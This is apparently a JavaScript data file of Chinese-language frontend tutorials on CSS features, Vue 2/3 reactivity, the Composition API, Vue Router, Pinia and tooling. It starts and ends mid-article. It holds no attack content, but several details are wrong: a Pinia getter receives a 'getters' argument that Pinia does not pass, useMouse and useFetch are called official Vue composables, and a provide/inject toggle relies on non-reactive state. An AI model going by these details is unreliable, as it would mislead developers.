  .flex-col { flex-direction: column; }
  .items-center { align-items: center; }
  .justify-center { justify-content: center; }
}

/* 未命名层 */
@layer {
  .custom-style {
    /* 这个层在所有命名层之后 */
  }
}
\`\`\`

#### :has() 选择器

\`\`\`css
/* 包含图片的文章 */
article:has(img) {
  padding: 20px;
  border: 1px solid #ddd;
}

/* 包含徽章的卡片 */
.card:has(.badge) {
  border-color: #007bff;
}

/* 包含无效输入的表单 */
form:has(:invalid) {
  border: 2px solid #dc3545;
}

/* 组合使用：包含图片和视频的文章 */
article:has(img):has(video) {
  background-color: #f8f9fa;
}

/* 嵌套选择器 */
.card:has(.header .badge) {
  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
}

/* 与其他伪类组合 */
article:has(img):hover {
  transform: translateY(-2px);
}
\`\`\`

#### 其他现代特性

\`\`\`css
/* :is() 简化选择器 */
/* 之前 */
h1 .title, h2 .title, h3 .title {
  font-weight: 700;
}

/* 之后 */
:is(h1, h2, h3) .title {
  font-weight: 700;
}

/* :where() 零特异性 */
:where(h1, h2, h3) .title {
  /* 特异性为 0 */
  font-weight: 700;
}

/* accent-color 自定义表单控件 */
input[type="checkbox"],
input[type="radio"] {
  accent-color: #007bff;
}

/* aspect-ratio 保持宽高比 */
.image-container {
  aspect-ratio: 16/9;
  background-color: #f0f0f0;
}

/* gap 在 Flexbox 中 */
.flex-container {
  display: flex;
  gap: 20px;
}

/* @supports 特性查询 */
@supports (backdrop-filter: blur(10px)) {
  .glass-effect {
    backdrop-filter: blur(10px);
  }
}

@supports not (backdrop-filter: blur(10px)) {
  .glass-effect {
    background-color: rgba(255, 255, 255, 0.9);
  }
}
\`\`\`

### 最佳实践

- 使用容器查询实现组件级响应式
- 理解级联层的优先级规则
- 合理使用 :has() 选择器
- 关注浏览器支持情况
- 使用 @supports 提供回退方案
- 渐进增强策略
- 性能优化（避免过度使用复杂选择器）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-fundamentals",title:"Vue 核心原理与响应式系统",category:"vue",difficulty:"medium",tags:["Vue","响应式","数据绑定"],content:`## Vue 核心原理与响应式系统

Vue.js 是一个渐进式 JavaScript 框架，其核心特性是响应式系统，理解其原理对于掌握 Vue 至关重要。Vue的响应式系统是其最核心的特性之一，它使得数据变化能够自动反映到视图上，极大地简化了前端开发。Vue 2和Vue 3使用了不同的响应式实现方式，各有优劣。

### 💚 响应式系统原理

**Object.defineProperty (Vue 2)：**
Vue 2使用Object.defineProperty的getter和setter来实现响应式系统。这种方式通过遍历data选项中的所有属性，将每个属性转换为getter/setter，从而在属性被访问或修改时触发相应的依赖收集和派发更新。Object.defineProperty的缺点是数组索引和新增属性无法被自动检测到，需要使用Vue.set或this.$set方法手动添加响应式。此外，Object.defineProperty无法检测到对象属性的删除，需要使用Vue.delete方法。

\`\`\`javascript
// Vue 2 响应式实现原理
function defineReactive(obj, key, val) {
  const dep = new Dep(); // 每个属性都有一个依赖收集器
  
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      // 依赖收集：将当前的Watcher添加到依赖列表
      if (Dep.target) {
        dep.depend();
      }
      return val;
    },
    set(newVal) {
      if (newVal === val) return;
      val = newVal;
      // 派发更新：通知所有依赖的Watcher重新渲染
      dep.notify();
    }
  });
}

// 依赖收集器
class Dep {
  constructor() {
    this.subs = []; // 存储所有Watcher
  }
  
  depend() {
    if (Dep.target) {
      this.subs.push(Dep.target);
    }
  }
  
  notify() {
    this.subs.forEach(sub => sub.update());
  }
}

// 观察者
class Watcher {
  constructor(vm, expr, cb) {
    this.vm = vm;
    this.expr = expr;
    this.cb = cb;
    // 触发getter，进行依赖收集
    Dep.target = this;
    this.value = vm[expr];
    Dep.target = null;
  }
  
  update() {
    const newVal = this.vm[this.expr];
    this.cb(newVal);
  }
}

// Observer：将对象的所有属性转换为响应式
class Observer {
  constructor(obj) {
    this.walk(obj);
  }
  
  walk(obj) {
    Object.keys(obj).forEach(key => {
      defineReactive(obj, key, obj[key]);
    });
  }
}

// Vue 2 响应式的局限性
const vm = new Vue({
  data: {
    items: ['a', 'b', 'c'],
    user: { name: 'Alice' }
  }
});

// ❌ 无法检测到数组索引赋值
vm.items[0] = 'x'; // 不是响应式的
// ✅ 使用 Vue.set
Vue.set(vm.items, 0, 'x'); // 响应式的

// ❌ 无法检测到数组长度修改
vm.items.length = 2; // 不是响应式的
// ✅ 使用 splice
vm.items.splice(2); // 响应式的

// ❌ 无法检测到新增属性
vm.user.age = 25; // 不是响应式的
// ✅ 使用 Vue.set
Vue.set(vm.user, 'age', 25); // 响应式的
\`\`\`

**Proxy (Vue 3)：**
Vue 3使用ES6 Proxy实现响应式系统，解决了Vue 2的所有局限性。Proxy可以直接代理整个对象而非对象的属性，支持数组索引检测、新增属性检测、删除属性检测等。Proxy是懒加载的，只有当属性被访问时才创建响应式连接，性能更好。Vue 3还引入了reactive、ref、computed等响应式API，提供了更灵活的响应式编程方式。

\`\`\`javascript
// Vue 3 响应式实现原理
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      // 如果是对象，递归代理
      if (typeof result === 'object' && result !== null) {
        return reactive(result);
      }
      return result;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      // 派发更新
      if (oldValue !== value) {
        trigger(target, key);
      }
      return result;
    },
    deleteProperty(target, key) {
      const result = Reflect.deleteProperty(target, key);
      // 派发更新
      trigger(target, key);
      return result;
    }
  });
}

// 依赖收集
const targetMap = new WeakMap();
let activeEffect = null;

function track(target, key) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(key);
  if (!dep) {
    depsMap.set(key, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

// 派发更新
function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());
  }
}

// effect 函数
function effect(fn) {
  activeEffect = fn;
  fn();
  activeEffect = null;
}

// Vue 3 响应式的优势
const state = reactive({
  items: ['a', 'b', 'c'],
  user: { name: 'Alice' }
});

// ✅ 可以检测到数组索引赋值
state.items[0] = 'x'; // 响应式的

// ✅ 可以检测到数组长度修改
state.items.length = 2; // 响应式的

// ✅ 可以检测到新增属性
state.user.age = 25; // 响应式的

// ✅ 可以检测到删除属性
delete state.user.name; // 响应式的
\`\`\`

**依赖收集流程：**
依赖收集是Vue响应式系统的核心机制。当组件渲染时，会访问数据属性，触发getter，将当前正在执行的副作用函数（effect）收集到该属性的依赖列表中。当属性被修改时，触发setter，通知所有依赖该属性的副作用函数重新执行，从而更新视图。这个过程是自动的，开发者无需手动管理依赖关系。

\`\`\`javascript
// 依赖收集流程示例
const state = reactive({ count: 0 });

// 组件渲染函数
function render() {
  // 访问 state.count，触发 getter
  // 将 render 函数添加到 count 的依赖列表
  console.log('Count:', state.count);
}

// 收集依赖
effect(render); // render 被添加到 count 的依赖列表

// 修改数据，触发更新
state.count++; // 触发 setter，执行 render 函数
\`\`\`

### 💻 代码示例：Vue 响应式实现

#### 🔄 Vue 2 响应式实现

\`\`\`javascript
// 简化的 Vue 2 响应式实现
function defineReactive(obj, key, val) {
  const dep = new Dep();
  
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      // 依赖收集
      if (Dep.target) {
        dep.depend();
      }
      return val;
    },
    set(newVal) {
      if (newVal === val) return;
      val = newVal;
      // 派发更新
      dep.notify();
    }
  });
}

class Dep {
  constructor() {
    this.subs = [];
  }
  
  depend() {
    if (Dep.target) {
      this.subs.push(Dep.target);
    }
  }
  
  notify() {
    this.subs.forEach(sub => sub.update());
  }
}

Dep.target = null;
\`\`\`

#### Vue 3 响应式实现

\`\`\`javascript
// Vue 3 使用 Proxy 实现响应式
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      return result;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      // 派发更新
      if (oldValue !== value) {
        trigger(target, key);
      }
      return result;
    }
  });
}

// 依赖收集
const targetMap = new WeakMap();
let activeEffect = null;

function track(target, key) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(key);
  if (!dep) {
    depsMap.set(key, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

// 派发更新
function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());
  }
}

// 使用示例
const state = reactive({
  count: 0,
  name: 'Vue'
});

effect(() => {
  console.log(\`Count: \${state.count}\`);
});

state.count++; // 触发更新
\`\`\`

### 数据绑定

**单向绑定：**
- v-bind 指令
- 从数据到视图的单向数据流
- 适合表单元素以外的场景

**双向绑定：**
- v-model 指令
- 数据与视图的双向同步
- 本质是 v-bind 和 v-on 的语法糖

**计算属性：**
- computed 选项
- 基于依赖自动缓存
- 只在依赖变化时重新计算

**监听器：**
- watch 选项
- 响应数据变化
- 支持深度监听和立即执行

### 代码示例

#### 数据绑定示例

\`\`\`vue
<template>
  <div>
    <!-- 单向绑定 -->
    <p>{{ message }}</p>
    <p v-text="message"></p>
    <div v-html="htmlContent"></div>
    
    <!-- 属性绑定 -->
    <img :src="imageUrl" :alt="imageAlt">
    <a :href="linkUrl">Link</a>
    <div :class="{ active: isActive }">Class Binding</div>
    <div :style="{ color: textColor }">Style Binding</div>
    
    <!-- 双向绑定 -->
    <input v-model="username" placeholder="Username">
    <textarea v-model="description"></textarea>
    <select v-model="selectedOption">
      <option value="option1">Option 1</option>
      <option value="option2">Option 2</option>
    </select>
    
    <!-- 修饰符 -->
    <input v-model.lazy="username">
    <input v-model.number="age" type="number">
    <input v-model.trim="message">
  </div>
</template>

<script>
export default {
  data() {
    return {
      message: 'Hello, Vue!',
      htmlContent: '<strong>Bold Text</strong>',
      imageUrl: '/image.jpg',
      imageAlt: 'Image',
      linkUrl: 'https://example.com',
      isActive: true,
      textColor: 'red',
      username: '',
      description: '',
      selectedOption: 'option1',
      age: 0
    };
  }
};
</script>
\`\`\`

#### 计算属性和监听器示例

\`\`\`vue
<template>
  <div>
    <p>First Name: {{ firstName }}</p>
    <p>Last Name: {{ lastName }}</p>
    <p>Full Name: {{ fullName }}</p>
    <p>Full Name (Computed): {{ fullNameComputed }}</p>
    
    <input v-model="firstName" placeholder="First Name">
    <input v-model="lastName" placeholder="Last Name">
  </div>
</template>

<script>
export default {
  data() {
    return {
      firstName: 'John',
      lastName: 'Doe',
      fullName: ''
    };
  },
  
  computed: {
    // 计算属性：基于依赖自动缓存
    fullNameComputed() {
      console.log('Computed property called');
      return \`\${this.firstName} \${this.lastName}\`;
    },
    
    // 只读计算属性
    fullNameReadOnly: {
      get() {
        return \`\${this.firstName} \${this.lastName}\`;
      }
    },
    
    // 可写计算属性
    fullNameWritable: {
      get() {
        return \`\${this.firstName} \${this.lastName}\`;
      },
      set(newValue) {
        const names = newValue.split(' ');
        this.firstName = names[0];
        this.lastName = names[names.length - 1];
      }
    }
  },
  
  watch: {
    // 监听器：响应数据变化
    firstName(newVal, oldVal) {
      console.log(\`First name changed from \${oldVal} to \${newVal}\`);
      this.fullName = \`\${newVal} \${this.lastName}\`;
    },
    
    lastName(newVal, oldVal) {
      console.log(\`Last name changed from \${oldVal} to \${newVal}\`);
      this.fullName = \`\${this.firstName} \${newVal}\`;
    },
    
    // 深度监听
    user: {
      handler(newVal, oldVal) {
        console.log('User changed:', newVal);
      },
      deep: true
    },
    
    // 立即执行
    message: {
      handler(newVal) {
        console.log('Message:', newVal);
      },
      immediate: true
    }
  }
};
</script>
\`\`\`

### 组件系统

**组件注册：**
- 全局注册：Vue.component()
- 局部注册：components 选项
- 单文件组件：.vue 文件

**组件通信：**
- props：父向子传递数据
- emit：子向父传递事件
- provide/inject：跨层级通信
- event bus：事件总线
- Vuex/Pinia：状态管理：Vuex是Vue 2官方推荐的状态管理库，提供集中式状态管理、状态变更追踪、组件间通信等能力，采用单向数据流模式，Pinia是Vue 3官方推荐的状态管理库，相比Vuex更轻量、TypeScript支持更好、模块化更简洁，两者都是Vue项目中管理应用状态的常用选择

**插槽：**
- 匿名插槽
- 命名插槽
- 作用域插槽
- 动态插槽

### 代码示例

#### 组件注册示例

\`\`\`javascript
// 全局注册
Vue.component('my-component', {
  template: '<div>Global Component</div>'
});

// 局部注册
export default {
  components: {
    'my-component': MyComponent
  }
};

// 单文件组件
// MyComponent.vue
<template>
  <div>
    <h2>{{ title }}</h2>
    <slot></slot>
  </div>
</template>

<script>
export default {
  name: 'MyComponent',
  props: {
    title: {
      type: String,
      required: true
    }
  }
};
</script>
\`\`\`

#### 组件通信示例

\`\`\`vue
<!-- 父组件 -->
<template>
  <div>
    <h1>Parent Component</h1>
    <p>Message from child: {{ childMessage }}</p>
    
    <!-- Props -->
    <ChildComponent
      :parent-message="parentMessage"
      @child-event="handleChildEvent"
    />
  </div>
</template>

<script>
import ChildComponent from './ChildComponent.vue';

export default {
  components: {
    ChildComponent
  },
  data() {
    return {
      parentMessage: 'Hello from parent',
      childMessage: ''
    };
  },
  methods: {
    handleChildEvent(message) {
      this.childMessage = message;
    }
  }
};
</script>

<!-- 子组件 -->
<template>
  <div>
    <h2>Child Component</h2>
    <p>Message from parent: {{ parentMessage }}</p>
    
    <button @click="sendMessage">Send Message to Parent</button>
  </div>
</template>

<script>
export default {
  props: {
    parentMessage: {
      type: String,
      required: true
    }
  },
  methods: {
    sendMessage() {
      this.$emit('child-event', 'Hello from child');
    }
  }
};
</script>

<!-- provide/inject 示例 -->
<!-- 祖先组件 -->
<template>
  <div>
    <ParentComponent />
  </div>
</template>

<script>
export default {
  provide() {
    return {
      theme: 'dark',
      toggleTheme: this.toggleTheme
    };
  },
  methods: {
    toggleTheme() {
      this.theme = this.theme === 'dark' ? 'light' : 'dark';
    }
  }
};
</script>

<!-- 后代组件 -->
<template>
  <div :class="theme">
    <h2>Descendant Component</h2>
    <button @click="toggleTheme">Toggle Theme</button>
  </div>
</template>

<script>
export default {
  inject: ['theme', 'toggleTheme']
};
</script>
\`\`\`

#### 插槽示例

\`\`\`vue
<!-- 基础插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <p>This is slot content</p>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <h2>My Component</h2>
    <slot></slot>
  </div>
</template>

<!-- 命名插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <template v-slot:header>
        <h1>Header Content</h1>
      </template>
      
      <template #default>
        <p>Default Content</p>
      </template>
      
      <template #footer>
        <p>Footer Content</p>
      </template>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <slot name="header"></slot>
    <slot></slot>
    <slot name="footer"></slot>
  </div>
</template>

<!-- 作用域插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <template #default="{ user, index }">
        <p>{{ index }}: {{ user.name }}</p>
      </template>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <slot
      v-for="(user, index) in users"
      :user="user"
      :index="index"
    ></slot>
  </div>
</template>

<script>
export default {
  data() {
    return {
      users: [
        { name: 'Alice' },
        { name: 'Bob' }
      ]
    };
  }
};
</script>
\`\`\`

### 生命周期

**Vue 2 生命周期：**
- beforeCreate：实例创建前
- created：实例创建后
- beforeMount：挂载前
- mounted：挂载后
- beforeUpdate：更新前
- updated：更新后
- beforeDestroy：销毁前
- destroyed：销毁后

**Vue 3 生命周期：**
- beforeCreate → setup()
- created → setup()
- beforeMount → onBeforeMount
- mounted → onMounted
- beforeUpdate → onBeforeUpdate
- updated → onUpdated
- beforeUnmount → onBeforeUnmount
- unmounted → onUnmounted

### 代码示例

#### Vue 2 生命周期示例

\`\`\`vue
<template>
  <div>
    <p>Count: {{ count }}</p>
    <button @click="increment">Increment</button>
  </div>
</template>

<script>
export default {
  data() {
    return {
      count: 0
    };
  },
  
  beforeCreate() {
    console.log('beforeCreate: 实例创建前');
    // 无法访问 data、methods、computed
  },
  
  created() {
    console.log('created: 实例创建后');
    // 可以访问 data、methods、computed
    // 常用于初始化数据、发起网络请求
    this.fetchData();
  },
  
  beforeMount() {
    console.log('beforeMount: 挂载前');
    // DOM 还未渲染
  },
  
  mounted() {
    console.log('mounted: 挂载后');
    // DOM 已渲染
    // 常用于操作 DOM、初始化第三方库
    this.initChart();
  },
  
  beforeUpdate() {
    console.log('beforeUpdate: 更新前');
    // 数据变化，DOM 还未更新
  },
  
  updated() {
    console.log('updated: 更新后');
    // DOM 已更新
    // 避免在这里修改数据，可能导致无限循环
  },
  
  beforeDestroy() {
    console.log('beforeDestroy: 销毁前');
    // 清理定时器、事件监听器等
    this.cleanup();
  },
  
  destroyed() {
    console.log('destroyed: 销毁后');
    // 实例已销毁
  },
  
  methods: {
    increment() {
      this.count++;
    },
    
    fetchData() {
      // 发起网络请求
      fetch('/api/data')
        .then(response => response.json())
        .then(data => {
          this.data = data;
        });
    },
    
    initChart() {
      // 初始化图表
      this.chart = new Chart(this.$refs.chart, {
        // 配置项
      });
    },
    
    cleanup() {
      // 清理定时器
      if (this.timer) {
        clearInterval(this.timer);
      }
      
      // 清理图表
      if (this.chart) {
        this.chart.destroy();
      }
    }
  }
};
</script>
\`\`\`

#### Vue 3 生命周期示例

\`\`\`vue
<template>
  <div>
    <p>Count: {{ count }}</p>
    <button @click="increment">Increment</button>
  </div>
</template>

<script>
import { ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted } from 'vue';

export default {
  setup() {
    const count = ref(0);
    let timer = null;
    
    // 挂载前
    onBeforeMount(() => {
      console.log('onBeforeMount: 挂载前');
    });
    
    // 挂载后
    onMounted(() => {
      console.log('onMounted: 挂载后');
      // 初始化定时器
      timer = setInterval(() => {
        console.log('Timer tick');
      }, 1000);
    });
    
    // 更新前
    onBeforeUpdate(() => {
      console.log('onBeforeUpdate: 更新前');
    });
    
    // 更新后
    onUpdated(() => {
      console.log('onUpdated: 更新后');
    });
    
    // 卸载前
    onBeforeUnmount(() => {
      console.log('onBeforeUnmount: 卸载前');
    });
    
    // 卸载后
    onUnmounted(() => {
      console.log('onUnmounted: 卸载后');
      // 清理定时器
      if (timer) {
        clearInterval(timer);
      }
    });
    
    const increment = () => {
      count.value++;
    };
    
    return {
      count,
      increment
    };
  }
};
</script>
\`\`\`

### 最佳实践

- 优先使用 Composition API
- 合理使用计算属性和监听器
- 组件拆分要合理，保持单一职责
- 使用 TypeScript 提高代码质量
- 合理使用 Vuex/Pinia 进行状态管理
- 避免直接修改 props
- 使用 key 属性提高列表渲染性能
- 合理使用 v-if 和 v-show

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-composition-api",title:"Vue 3 Composition API 详解",category:"vue",difficulty:"medium",tags:["Vue 3","Composition API","setup"],content:`## Vue 3 Composition API 详解

Composition API 是 Vue 3 引入的新特性，提供了更灵活的代码组织方式，解决了 Options API 的一些局限性。

### Composition API 基础

**setup() 函数：**
- 组件的入口点
- 在 beforeCreate 和 created 之前执行
- 接收 props 和 context 两个参数
- 返回的对象会暴露给模板和其他选项

**响应式 API：**
- ref()：创建响应式引用
- reactive()：创建响应式对象
- computed()：创建计算属性
- watch()：监听响应式数据
- watchEffect()：自动追踪依赖的副作用

**生命周期钩子：**
- onBeforeMount
- onMounted
- onBeforeUpdate
- onUpdated
- onBeforeUnmount
- onUnmounted
- onErrorCaptured
- onRenderTracked
- onRenderTriggered

### 优势与使用场景

**代码组织：**
- 按功能组织代码
- 逻辑复用更灵活
- 减少选项 API 的命名冲突

**TypeScript 支持：**
- 更好的类型推断
- 更清晰的类型定义
- 减少类型断言

**逻辑复用：**
- Composables 模式：Composables是Vue 3引入的组合式API设计模式，通过抽取可复用的逻辑函数实现代码复用，类似React的Custom Hooks，使用use开头命名约定，可以在Vue组件中复用状态和逻辑，Vue官方提供了useMouse、useFetch等内置Composables，开发者也可以创建自定义Composables，是Vue 3最强大的代码复用方式
- 可重用的逻辑函数
- 类似于 React Hooks

**大型应用：**
- 更好的代码组织
- 更清晰的逻辑分离
- 便于维护和测试

### 响应式 API 详解

**ref：**
- 用于基本类型和复杂类型
- 通过 .value 访问和修改
- 在模板中自动解包
- 适合单个值的响应式

**reactive：**
- 用于对象和数组
- 直接访问和修改属性
- 深度响应
- 不支持基本类型

**computed：**
- 自动缓存
- 基于依赖更新
- 可以设置 getter 和 setter
- 适合派生状态

**watch：**
- 可以监听多个源
- 支持深度监听
- 支持立即执行
- 支持回调函数

**watchEffect：**
- 自动追踪依赖
- 立即执行
- 返回停止函数
- 适合副作用处理

### 实际应用

**状态管理：**
- 使用 reactive 和 ref 管理组件状态
- 复杂状态可以使用 Pinia
- 避免过度使用全局状态

**表单处理：**
- 使用 ref 管理表单数据
- 计算属性验证
- 响应式验证规则

**API 调用：**
- 在 onMounted 中发起请求
- 使用 ref 管理加载状态
- watch 监听参数变化

**动画和过渡：**
- 使用 ref 管理动画状态
- watchEffect 处理动画逻辑
- 结合 CSS 动画

### 迁移策略

**从 Options API 迁移：**
- 逐步迁移
- 混合使用两种 API
- 使用 Composition API 重构复杂逻辑

**常见模式：**
- 提取可复用逻辑为 composables
- 按功能组织代码
- 利用 TypeScript 类型

### 最佳实践

- 合理使用 ref 和 reactive
- 按功能组织 composables
- 避免在 setup 中使用 this
- 正确处理异步操作
- 合理使用生命周期钩子
- 测试 composables
- 文档化 composables 的用法`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-router",title:"Vue Router 路由管理",category:"vue",difficulty:"medium",tags:["Vue","Router","路由","SPA"],content:`## Vue Router 路由管理

Vue Router 是 Vue 官方的路由管理器，用于构建单页应用（SPA）的导航系统。

### 基本配置

**安装：**
- npm install vue-router@4（Vue 3）
- npm install vue-router@3（Vue 2）

**创建路由实例：**
- createRouter()（Vue 3）
- new VueRouter()（Vue 2）
- 配置 routes 数组

**挂载路由：**
- Vue 3：app.use(router)：Vue 3使用app.use()方法注册插件和路由，router是Vue Router 4的实例，通过app.use(router)将路由实例挂载到Vue应用上，Vue Router 4是专门为Vue 3设计的路由库，提供了更好的TypeScript支持、组合式API支持、路由守卫改进等特性
- Vue 2：new Vue({ router })：Vue 2在创建根实例时将router作为选项传入，router是Vue Router 3的实例，Vue Router 3是Vue 2官方路由库，支持动态路由、嵌套路由、路由守卫等功能，是Vue 2项目路由管理的标准选择

**基本路由配置：**

\`\`\`javascript
const routes = [
  {
    path: '/',
    component: Home
  },
  {
    path: '/about',
    component: About
  }
];
\`\`\`

### 路由模式

**hash 模式：**
- URL 中包含 #：Vue Router默认使用Hash模式，URL中包含#符号如example.com/#/home，这种模式下路由变化不会触发页面刷新，兼容性更好不需要服务器配置，Hash模式利用window.location.hash进行路由管理，是Vue Router的默认模式
- 兼容性好
- 不需要服务器配置

**history 模式：**
- 更美观的 URL
- 需要服务器配置（404 重定向）
- 依赖 HTML5 History API

**abstract 模式：**
- 无浏览器环境下使用
- 如 Node.js 环境

### 路由导航

**声明式导航：**
- <router-link> 组件
- to 属性指定目标路由
- active-class 高亮当前路由
- exact-active-class 精确匹配高亮

**编程式导航：**
- router.push()：导航到新位置
- router.replace()：替换当前位置
- router.go()：前进或后退
- router.back()：后退
- router.forward()：前进

**导航守卫：**
- 全局前置守卫：router.beforeEach()
- 全局解析守卫：router.beforeResolve()
- 全局后置守卫：router.afterEach()
- 路由独享守卫：beforeEnter
- 组件内守卫：beforeRouteEnter、beforeRouteUpdate、beforeRouteLeave

### 路由参数

**动态路由：**
- path: '/user/:id'
- this.$route.params.id（Vue 2）
- useRoute().params.id（Vue 3）

**查询参数：**
- path: '/search?keyword=vue'
- this.$route.query.keyword（Vue 2）
- useRoute().query.keyword（Vue 3）

**路由元信息：**
- meta 字段
- 存储路由相关信息
- 如权限、标题等

### 嵌套路由

**配置：**
- children 数组
- 相对路径
- 多级嵌套

**示例：**

\`\`\`javascript
{
  path: '/user',
  component: User,
  children: [
    {
      path: 'profile',
      component: UserProfile
    },
    {
      path: 'settings',
      component: UserSettings
    }
  ]
}
\`\`\`

### 路由懒加载

**动态导入：**
- () => import('./views/Home.vue')
- 减少初始打包体积
- 按需加载组件

**Webpack 魔法注释：**
- /* webpackChunkName: "home" */
- 自定义 chunk 名称
- 更好的代码分割

**预加载：**
- webpackPrefetch: true
- 浏览器空闲时预加载
- 提升用户体验

### 路由守卫应用

**权限控制：**
- 检查用户登录状态
- 验证权限
- 重定向未授权用户

**页面标题：**
- 基于路由元信息设置标题
- 全局后置守卫
- 动态标题

**数据预加载：**
- 导航前获取数据
- 避免白屏
- 提升用户体验

### 最佳实践

- 使用路由懒加载
- 合理使用导航守卫
- 配置 404 页面
- 处理路由错误
- 测试路由功能
- 性能优化策略`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-pinia",title:"Pinia 状态管理",category:"vue",difficulty:"medium",tags:["Vue","Pinia","状态管理","Store"],content:`## Pinia 状态管理

Pinia 是 Vue 3 官方推荐的状态管理库，替代了 Vuex，提供了更简洁的 API 和更好的 TypeScript 支持。

### Pinia 简介

**Pinia 与 Vuex 的区别：**
- 更简洁的 API，无需 mutations
- 更好的 TypeScript 支持
- 支持组合式 API
- 更小的包体积
- 更灵活的存储结构

**安装：**
- npm install pinia
- Vue 3：app.use(createPinia())：Vue 3使用createPinia()创建Pinia实例，通过app.use()方法注册到Vue应用，Pinia是Vue 3官方推荐的状态管理库，提供了更简洁的API、更好的TypeScript支持、模块化状态管理、自动订阅等特性，是Vue 3项目状态管理的首选
- Vue 2：需要 @vue/composition-api：Vue 2使用Pinia需要安装@vue/composition-api插件来支持Composition API，配置后可以在Vue 2项目中使用createPinia()创建状态存储，@vue/composition-api是Vue 2使用Composition API的官方适配器，使得Vue 2也可以享受Composition API带来的代码组织优势

### 基本使用

**创建 Store：**
- defineStore() 函数
- 第一个参数是 store 的唯一 ID
- 第二个参数是 store 的配置

**State：**
- 定义初始状态
- 可以是函数或对象
- 响应式数据

**Getters：**
- 计算属性
- 自动缓存
- 可以访问其他 getters

**Actions：**
- 异步操作
- 可以提交状态更改
- 可以访问其他 actions

### Store 配置

**State 定义：**

\`\`\`javascript
export const useCounterStore = defineStore('counter', {
  state: () => ({
    count: 0,
    name: 'Pinia'
  }),
  getters: {
    doubleCount: (state) => state.count * 2,
    doubleCountPlusOne: (state, getters) => getters.doubleCount + 1
  },
  actions: {
    increment() {
      this.count++
    },
    async incrementAsync() {
      await new Promise(resolve => setTimeout(resolve, 1000))
      this.count++
    }
  }
})
\`\`\`

**组件中使用：**

\`\`\`javascript
import { useCounterStore } from '@/stores/counter'

export default {
  setup() {
    const store = useCounterStore()
    
    return {
      store,
      increment: () => store.increment()
    }
  }
}
\`\`\`

### 高级特性

**模块化：**
- 按功能创建多个 store
- 模块之间可以相互访问
- 更好的代码组织

**持久化：**
- pinia-plugin-persistedstate
- 自动保存到 localStorage
- 支持自定义存储

**插件系统：**
- 扩展 Pinia 功能
- 自定义插件
- 官方插件生态

**调试：**
- Vue DevTools 支持：Vue DevTools是Vue官方浏览器扩展，提供组件树检查、组件状态查看、Vuex状态管理、时间旅行调试等功能，可以直观地查看组件层级、数据状态、事件流，是Vue开发调试的必备工具，支持Vue 2和Vue 3，在Chrome和Firefox商店可以安装
- 时间旅行
- 状态快照

### 最佳实践

- 按功能划分 store
- 使用 TypeScript 类型
- 合理使用 actions 处理异步
- 避免直接修改 state
- 测试 store 逻辑
- 性能优化策略`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-ecosystem",title:"Vue 生态系统与工具链",category:"vue",difficulty:"medium",tags:["Vue","生态系统","工具链","CLI"],content:`## Vue 生态系统与工具链

Vue 生态系统丰富多样，包括官方工具和社区工具，为开发提供了完整的解决方案。

### Vue CLI

**功能：**
- 脚手架工具
- 项目初始化
- 开发服务器
- 构建工具
- 插件系统

**安装：**
- npm install -g @vue/cli
- vue create project-name
- 交互式配置

**配置：**
- vue.config.js
- 自定义 webpack 配置
- 环境变量

### Vite

**特点：**
- 快速的开发服务器
- 按需编译
- 热模块替换
- 生产构建
- 支持多种框架

**创建项目：**
- npm create vite@latest project-name -- --template vue
- npm create vite@latest project-name -- --template vue-ts

**配置：**
- vite.config.js
- 插件系统
- 环境变量

### 官方工具

**Vue DevTools：**
- 浏览器扩展
- 组件树查看
- 状态管理
- 性能分析
- 时间旅行

**Vue Test Utils：**
- 测试库
- 组件测试
- 挂载组件
- 模拟用户交互

**Vue Router：**
- 官方路由
- 单页应用
- 路由守卫
- 懒加载

**Pinia：**
- 官方状态管理
- 替代 Vuex
- 简洁 API
- TypeScript 支持：Vue 3对TypeScript提供了更好的原生支持，Vue 3核心库使用TypeScript重写，提供了完整的类型定义，Composition API的setup函数可以直接返回类型化的数据，Vue Router 4和Pinia也都使用TypeScript编写，Vue项目的TypeScript支持已经非常成熟

### 社区工具

**UI 库：**
- Element Plus：Element Plus是Element UI的Vue 3版本，由饿了么团队开发维护，提供丰富的企业级UI组件，组件设计美观、功能完善、文档详尽，支持按需引入和主题定制，是国内Vue项目最常用的组件库之一，适合快速构建管理后台和业务系统
